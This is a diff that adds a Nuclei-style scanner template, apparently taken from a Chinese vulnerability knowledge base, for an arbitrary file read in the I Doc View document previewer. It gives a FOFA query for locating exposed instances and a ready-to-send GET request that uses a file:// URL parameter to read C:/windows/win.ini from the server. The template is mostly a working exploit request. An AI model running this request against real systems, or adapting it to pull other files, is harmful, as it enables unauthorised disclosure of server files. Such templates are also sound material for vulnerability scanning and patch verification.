@@ -1,0 +1,34 @@
+id: poc-mgbr90qwnwn9f9zi
+info:
+  name: I doc view qJvqhFt 任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mgbr90qwnwn9f9zi'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mgbr90qwnwn9f9zi
+    fofa: title="I Doc View"
+http:
+- raw:
+  - 'GET /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    fonts
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
